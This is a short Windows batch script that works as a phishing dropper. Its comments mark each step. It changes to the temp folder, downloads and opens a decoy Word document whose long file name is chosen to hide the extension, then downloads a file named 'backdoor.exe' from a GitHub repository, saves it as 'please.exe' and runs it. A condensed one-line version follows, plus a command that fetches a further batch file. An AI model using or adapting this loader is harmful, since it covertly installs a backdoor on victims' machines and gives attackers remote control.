@REM change to TEMP directory
cd %TEMP%

@REM get cover file
Powershell -Command "Invoke-WebRequest 'https://docs.google.com/document/d/1D-2mu8b37ITPCaOnSHQ76Ip5Me9AyrDZ/export?format=doc' -OutFile 'Test super long email name to see if you can see extension.docx'"

@REM open cover file
"Test super long email name to see if you can see extension.docx"

@REM Malicious file download
Powershell -Command "Invoke-WebRequest 'https://github.com/r3nelson/Backdoor/raw/main/backdoor.exe' -OutFile please.exe"

@REM Execute malicious file
"please.exe"


Powershell -Command "Invoke-WebRequest 'https://docs.google.com/document/d/1D-2mu8b37ITPCaOnSHQ76Ip5Me9AyrDZ/export?format=doc' -OutFile 'Test super long email name to see if you can see extension.docx'"; "Test super long email name to see if you can see extension.docx"; "Invoke-WebRequest 'https://github.com/r3nelson/Backdoor/raw/main/backdoor.exe' -OutFile please.exe"; please.exe;


Powershell -Command "Invoke-WebRequest 'https://docs.google.com/document/d/1mT9Fvt5PzgjL2ZOOsYud7qwKqjpxWSKj/export?format=doc' -OutFile 'b.bat'"

